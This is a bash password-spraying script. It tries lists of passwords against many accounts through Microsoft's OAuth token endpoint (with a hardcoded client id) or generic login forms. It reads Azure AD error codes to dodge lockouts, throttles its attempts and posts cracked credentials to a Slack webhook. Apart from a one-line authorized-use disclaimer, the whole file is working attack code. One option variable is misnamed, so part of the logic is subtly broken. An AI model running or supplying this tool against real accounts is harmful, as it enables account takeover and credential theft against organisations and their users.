#!/bin/bash

# Password Spray
# Multi-target password spray with smart rotation, lockout detection, and Slack alerts
# Usage: ./password_spray.sh <target_file> <password_list> [-o output_dir] [-j]
# Requires: curl, jq
# Disclaimer: For authorized security testing only. Know your lockout policies.

set -euo pipefail

TARGET_FILE="${1:-}"
PASSWORD_LIST="${2:-}"
OUTPUT_DIR=""
JSON_OUTPUT=false
LOCKOUT_THRESHOLD=3
COOLOFF_MINUTES=30
SLEEP_BETWEEN=5
SLACK_WEBHOOK=""
MAX_ATTEMPTS_PER_PASS=5
DRY_RUN=false

RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' BLUE='\033[0;34m' CYAN='\033[0;36m' NC='\033[0m'
log()   { echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')] $1${NC}"; }
warn()  { echo -e "${YELLOW}[-] $1${NC}"; }
found() { echo -e "${GREEN}[✓] $1${NC}"; }
fail()  { echo -e "${RED}[!] $1${NC}"; }

usage() {
    head -4 "$0" | cut -c4-
    echo ""
    echo "Usage:"
    echo "  $0 <target_file> <password_list> [options]"
    echo ""
    echo "Target file: one target per line (email, username, or URL)"
    echo "Password list: one password per line"
    echo ""
    echo "Options:"
    echo "  -o, --output DIR         Output directory"
    echo "  -j, --json               JSON output"
    echo "  -w, --webhook URL        Slack webhook for alerts"
    echo "  -t, --threshold N        Lockout threshold (default: 3 failures)"
    echo "  -c, --cooloff MINS        Cooloff after lockout (default: 30 mins)"
    echo "  -s, --sleep SECS         Sleep between attempts (default: 5)"
    echo "  -n, --max-attempts N     Max attempts per password (default: 5)"
    echo "  -d, --dry-run            Test without sending requests"
    echo "  -h, --help               Show this help"
    echo ""
    echo "Example:"
    echo "  $0 targets.txt passwords.txt -w https://hooks.slack.com/... -t 5"
    echo "  $0 users.txt wordlist.txt -s 10 -c 60 -j"
    exit 1
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
        -j|--json) JSON_OUTPUT=true; shift ;;
        -w|--webhook) SLACK_WEBHOOK="$2"; shift 2 ;;
        -t|--threshold) LOCKOUT_THRESHOLD="$2"; shift 2 ;;
        -c|--cooloff) COOLOFF_MINUTES="$2"; shift 2 ;;
        -s|--sleep) SLEEP_BETWEEN="$2"; shift 2 ;;
        -n|--max-attempts) MAX_ATTEMPTS="$2"; shift 2 ;;
        -d|--dry-run) DRY_RUN=true; shift ;;
        -h|--help) usage ;;
        *) [[ -z "$TARGET_FILE" ]] && TARGET_FILE="$1" || [[ -z "$PASSWORD_LIST" ]] && PASSWORD_LIST="$1"; shift ;;
    esac
done

[[ -z "$TARGET_FILE" || -z "$PASSWORD_LIST" ]] && usage
[[ ! -f "$TARGET_FILE" ]] && fail "Target file not found: $TARGET_FILE" && exit 1
[[ ! -f "$PASSWORD_LIST" ]] && fail "Password list not found: $PASSWORD_LIST" && exit 1

[[ -z "$OUTPUT_DIR" ]] && OUTPUT_DIR="spray_$(date +%Y-%m-%d_%H)"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$OUTPUT_DIR/spray.log"
HITS_FILE="$OUTPUT_DIR/hits.txt"
ATTEMPTS_FILE="$OUTPUT_DIR/attempts.txt"
JSON_FILE="$OUTPUT_DIR/results.json"
STATE_FILE="$OUTPUT_DIR/spray_state.json"

log "Starting password spray"
log "  Targets: $TARGET_FILE ($(wc -l < "$TARGET_FILE" | xargs) entries)"
log "  Passwords: $PASSWORD_LIST ($(wc -l < "$PASSWORD_LIST" | xargs) entries)"
[[ "$DRY_RUN" == "true" ]] && warn "  DRY RUN MODE — no actual requests"

# ─── State tracking ───
declare -A LOCKOUT_COUNT
declare -A LAST_ATTEMPT
declare -A COOLOFF_UNTIL
HIT_COUNT=0
TOTAL_ATTEMPTS=0
FAILED_COUNT=0

load_state() {
    [[ -f "$STATE_FILE" ]] && source "$STATE_FILE" 2>/dev/null || true
}

save_state() {
    echo "HIT_COUNT=$HIT_COUNT" > "$STATE_FILE"
    echo "TOTAL_ATTEMPTS=$TOTAL_ATTEMPTS" >> "$STATE_FILE"
}

# ─── Slack notification ───
send_slack() {
    local message="$1"
    [[ -z "$SLACK_WEBHOOK" ]] && return
    curl -s -X POST "$SLACK_WEBHOOK" \
        -H 'Content-Type: application/json' \
        -d "{\"text\": \"[PasswordSpray] $message\"}" >/dev/null 2>&1 || true
}

# ─── Auth attempt function ───
# Override this based on your target type (O365, Okta, custom, etc.)
# Returns: SUCCESS | LOCKED | FAILED | RATE_LIMITED

authenticate() {
    local target="$1"
    local password="$2"

    if [[ "$DRY_RUN" == "true" ]]; then
        echo "DRY_RUN|$target|$password"
        return
    fi

    ((TOTAL_ATTEMPTS++))

    # Detect target type and attempt auth
    case "$target" in
        *@*)
            # Email target — determine provider
            domain="${target#*@}"
            ;;
    esac

    # O365 / Microsoft
    if [[ "$target" =~ @ ]]; then
        response=$(curl -s -w "\nHTTP_CODE:%{http_code}" --max-time 20 \
            -X POST "https://login.microsoftonline.com/common/oauth2/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=password&username=$target&password=$password&client_id=1b730954-1685-4b74-9bfd-ac95a13d4da8" \
            2>/dev/null || echo "ERROR")

        http_code=$(echo "$response" | grep "HTTP_CODE:" | sed 's/HTTP_CODE://')
        body=$(echo "$response" | sed '/HTTP_CODE:/d')

        if echo "$body" | grep -qi "access_token\|token_type"; then
            echo "SUCCESS"
        elif echo "$body" | grep -qi "AADSTS50057\|AADSTS50053\|AADSTS50126"; then
            # Account locked/disabled
            echo "LOCKED"
        elif echo "$body" | grep -qi "AADSTS50034\|AADSTS50128"; then
            # Invalid username
            echo "FAILED"
        else
            echo "FAILED"
        fi
        return
    fi

    # Generic HTTP form
    response=$(curl -s -w "\nHTTP_CODE:%{http_code}" --max-time 15 \
        -X POST "$target" \
        -d "username=admin&password=$password" \
        2>/dev/null || echo "ERROR")

    http_code=$(echo "$response" | grep "HTTP_CODE:" | sed 's/HTTP_CODE://')
    body=$(echo "$response" | sed '/HTTP_CODE:/d')

    # Customize detection for your target
    if echo "$body" | grep -qi "success\|dashboard\|welcome\|token\|authenticated\|login successful"; then
        echo "SUCCESS"
    elif echo "$body" | grep -qi "locked\|disabled\|account locked\|too many\|rate limit\|throttl"; then
        echo "RATE_LIMITED"
    elif [[ "$http_code" == "200" ]]; then
        echo "CHECK_MANUAL"
    else
        echo "FAILED"
    fi
}

# ─── Check if target is in cooloff ───
is_in_cooloff() {
    local target="$1"
    [[ -z "${COOLOFF_UNTIL[$target]:-}" ]] && return 1
    current_epoch=$(date +%s)
    cooloff_epoch="${COOLOFF_UNTIL[$target]:-0}"
    [[ "$current_epoch" -lt "$cooloff_epoch" ]] && return 0
    return 1
}

set_cooloff() {
    local target="$1"
    cooldown_epoch=$(( $(date +%s) + (COOLOFF_MINUTES * 60) ))
    COOLOFF_UNTIL["$target"]=$cooldown_epoch
    warn "  Cooloff set for $target until $(date -d "@$cooldown_epoch" '+%H:%M:%S')"
}

# ─── Main spray loop ───
log "Loading targets..."
mapfile -t TARGETS < "$TARGET_FILE"
mapfile -t PASSWORDS < "$PASSWORD_LIST"

TARGET_COUNT=${#TARGETS[@]}
PASS_COUNT=${#PASSWORDS[@]}

log "Starting spray: $TARGET_COUNT targets × $PASS_COUNT passwords"

send_slack "Starting spray: $TARGET_COUNT targets, $PASS_COUNT passwords"

for password in "${PASSWORDS[@]}"; do
    password=$(echo "$password" | tr -d '\r' | xargs)
    [[ -z "$password" ]] && continue

    pass_attempts=0

    log "═══ Testing password: $password ═══"

    for target in "${TARGETS[@]}"; do
        target=$(echo "$target" | tr -d '\r' | xargs)
        [[ -z "$target" ]] && continue

        # Check cooloff
        if is_in_cooloff "$target"; then
            ((FAILED_COUNT++))
            continue
        fi

        # Check lockout threshold
        if [[ "${LOCKOUT_COUNT[$target]:-0}" -ge "$LOCKOUT_THRESHOLD" ]]; then
            warn "  Skipping $target — lockout threshold reached (${LOCKOUT_COUNT[$target]})"
            set_cooloff "$target"
            continue
        fi

        # Check max attempts per password
        if [[ "$pass_attempts" -ge "$MAX_ATTEMPTS" ]]; then
            log "  Max attempts reached for this password, moving to next"
            break
        fi

        log "  Attempting: $target / $password"
        result=$(authenticate "$target" "$password")

        echo "$target|$password|$result|$(date)" >> "$ATTEMPTS_FILE"

        case "$result" in
            SUCCESS)
                found "  HIT! $target / $password"
                echo "$target|$password|SUCCESS|$(date)" >> "$HITS_FILE"
                ((HIT_COUNT++))
                send_slack "HIT: $target / $password"
                ((pass_attempts++))
                ;;
            LOCKED|RATE_LIMITED)
                warn "  Lockout/RateLimit: $target"
                LOCKOUT_COUNT["$target"]=$(( ${LOCKOUT_COUNT[$target]:-0} + 1 ))
                set_cooloff "$target"
                ;;
            FAILED|CHECK_MANUAL)
                LOCKOUT_COUNT["$target"]=$(( ${LOCKOUT_COUNT[$target]:-0} + 1 ))
                ((FAILED_COUNT++))
                ((pass_attempts++))
                ;;
        esac

        [[ "$DRY_RUN" != "true" ]] && sleep "$SLEEP_BETWEEN"
        save_state
    done

    log "Password $password complete — $pass_attempts attempts"
done

# ─── JSON output ───
if [[ "$JSON_OUTPUT" == "true" ]]; then
    log "Generating JSON output..."
    {
        echo "{"
        echo "  \"timestamp\": \"$(date -I)\","
        echo "  \"stats\": {"
        echo "    \"total_attempts\": $TOTAL_ATTEMPTS,"
        echo "    \"hits\": $HIT_COUNT,"
        echo "    \"failed\": $FAILED_COUNT,"
        echo "    \"targets\": $TARGET_COUNT,"
        echo "    \"passwords\": $PASS_COUNT"
        echo "  },"
        echo "  \"hits\": ["
        while IFS='|' read -r target password result date; do
            [[ -z "$target" ]] && continue
            [[ "$result" == "SUCCESS" ]] && echo "    {\"target\": \"$target\", \"password\": \"$password\", \"date\": \"$date\"},"
        done < "$HITS_FILE" | sed '$ s/,$//'
        echo "  ]"
        echo "}"
    } > "$JSON_FILE"
fi

send_slack "Spray complete: $HIT_COUNT hits out of $TOTAL_ATTEMPTS attempts"

# ─── Summary ───
log "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
log "Password Spray Complete"
echo -e "${RED}[!]${NC} Hits:           $HIT_COUNT"
echo -e "${GREEN}[✓]${NC} Total attempts:  $TOTAL_ATTEMPTS"
echo -e "${YELLOW}[-]${NC} Failed:         $FAILED_COUNT"
echo ""
echo -e "  Hits:      ${GREEN}$HITS_FILE${NC}"
echo -e "  Attempts:   ${CYAN}$ATTEMPTS_FILE${NC}"
echo -e "  State:     ${CYAN}$STATE_FILE${NC}"
[[ "$JSON_OUTPUT" == "true" ]] && echo -e "  JSON:      ${BLUE}$JSON_FILE${NC}"
echo ""

if [[ "$HIT_COUNT" -gt 0 ]]; then
    warn "Review $HITS_FILE — these credentials are confirmed working"
fi

log "Spray complete — use only with authorization"
log "IMPORTANT: Rotate any compromised passwords immediately"